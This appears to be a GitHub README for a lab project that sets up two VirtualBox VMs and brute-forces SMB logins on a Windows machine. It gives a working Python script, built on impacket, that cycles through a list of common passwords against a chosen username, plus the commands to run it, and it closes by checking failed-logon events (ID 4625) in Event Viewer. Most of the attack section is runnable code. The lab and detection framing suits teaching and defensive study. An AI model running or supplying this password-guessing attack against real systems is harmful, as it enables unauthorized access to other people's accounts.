# SMB Brute Force Script with Python (Internal Network)

This project demonstrates how to launch a brute force attack using the SMB protocol within a virtual internal network. It targets a Windows machine and verifies login failures via Event Viewer logs (Event ID 4625).

---

## About the Project  
This project simulates a brute force attack using Python and the SMB protocol between two virtual machines on the same NAT network in VirtualBox. It sends multiple login attempts to the Windows VM and verifies failed attempts through Event Viewer.

⚠ **This is for educational purposes only. Do not run this on unauthorized systems.**

---

## What is SMB?  
SMB (Server Message Block) is a network protocol mainly used for sharing files, printers, and other resources in a Windows environment. It allows applications to read/write files and request services over a network.

In this project, we exploit the SMB login mechanism by sending multiple password attempts using Python.

---

## Setup Instructions  

### 1. Create a NAT Network  
Open VirtualBox > Tools > Network > NAT Networks.

 
![image](https://github.com/user-attachments/assets/f06ff4b7-acc7-4ae7-87bb-cca64a2bf616)  
![image](https://github.com/user-attachments/assets/283e0613-4033-460d-807c-f51b528c900f)  

---

### 2. Assign NAT Network to VMs  
Assign the newly created NAT network to both Windows and Kali Linux VMs:  
`Settings > Network > Adapter 1 > Attached to: NAT Network.`

  
![image](https://github.com/user-attachments/assets/a4262543-4b56-4168-b37b-a564d8010d68)  
![image](https://github.com/user-attachments/assets/7dd978a3-caaa-4396-ba41-f9f6bea7b599)  

---

### 3. Find IP Addresses  
- On **Windows**, open Command Prompt and run:  
  ```bash
  ipconfig
- On Kali, run:
  ```bash
  ifconfig

Write down both IPs.
Example:

Windows IP: ```10.0.2.4```

Kali IP: ```10.0.2.5```

---
### 4. Enable SMB on Windows
-> Search and open Windows Defender Firewall with Advanced Security.

-> Go to Inbound Rules.

-> Enable the following rules:

     - File and Printer Sharing (SMB-In)

     - File and Printer Sharing (Echo Request - ICMPv4-In)



![image](https://github.com/user-attachments/assets/5255bc56-76c6-4bd4-baa4-2c28708a1c3d)

---
## **SMB Brute Force Script**

Create a Python script (`attack.py`) on Kali Linux:

### **Python Code**
```python
from impacket.smbconnection import SMBConnection
import time

target_ip = input("Enter target IP address: ")
username = input("Enter username to brute force: ")

passwords = [
    "password123", "123456", "admin", "letmein", "qwerty",
    "welcome", "password1", "abc123", "12345678", "admin123"
]

for i, password in enumerate(passwords, 1):
    try:
        print(f"[{i}] Trying password: {password}")
        conn = SMBConnection(target_ip, target_ip)
        conn.login(username, password)
        print(f"\n[✔] SUCCESS: Password is '{password}'")
        break
    except Exception as e:
        print(f"[✘] Failed login with: {password} - {e}")
        time.sleep(1)
else:
    print("\n[!] All 10 password attempts failed.")
```
---
### Running the Attack

On **Kali Linux VM**, open the terminal and run:

```bash
nano attack.py
# Paste the code and save it
python3 attack.py
```
You will be prompted to enter:

* Victim's IP (e.g., 10.0.2.4)

* Username to attack (e.g., Administrator)

Screenshot 

![image](https://github.com/user-attachments/assets/8ef6171d-3846-43b5-bb10-ae28491aed9d)

The script will attempt 10 password logins over SMB.

---
### Verifying the Attack

On **Windows VM**:

1. Open **Event Viewer** from the search.

2. Navigate to: Windows Logs > Security
   
3. Look for **Event ID: 4625**, which indicates logon failures.
 

![image](https://github.com/user-attachments/assets/dcb50530-b8ba-45bc-9cf5-4d567dd37f95)


If the brute force worked, you will see **10 failed logon attempts** matching the passwords used in the script.

---
###  Disclaimer

This script is intended for **educational and ethical hacking purposes only**.  
Do **NOT** use this on systems without explicit permission.




